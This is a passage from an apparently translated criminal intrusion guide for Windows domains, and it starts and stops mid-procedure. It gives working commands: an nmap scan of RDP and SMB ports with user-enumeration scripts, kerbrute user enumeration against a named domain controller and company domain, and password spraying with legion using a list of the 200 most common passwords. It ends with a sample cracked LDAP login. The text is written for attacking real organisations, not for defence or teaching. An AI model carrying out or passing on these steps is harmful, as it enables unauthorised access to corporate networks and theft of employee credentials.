nmap -p 3389,445 -v -iL "C:\\Users\\user\\Desktop\\123.txt" -script rdpntlm-info,smb-enum-users,smb-os-discovery

straightaway. If it doesn't roll:
We write out this line DNS_Domain_Name for ourselves:
There can be any value
Further in the attached archive I will give you a softina
Kerbrute.exe


Let's use it like this:
C:\kerbrute.exe userenum C:\userlist.txt --dc 10.20.10.6 -d rushenterprises.com

Poke enter and wait until all the supposed ones have moved
domain accounts.
After these manipulations, we copy everything that the kerbrute found to itself
into a separate textbook and clean everything, leaving only logins without
home @domain
Go to kali linux
Opening the console
We write there sudo legion

We put everything as I have previously indicated the file with logins,
who found kerbrut and ip DC.
Default passwords make your list of the 200 most frequent

Now it remains to wait for the results, which in the log looks like
something like this:
LDAP: engineering.calendar:password
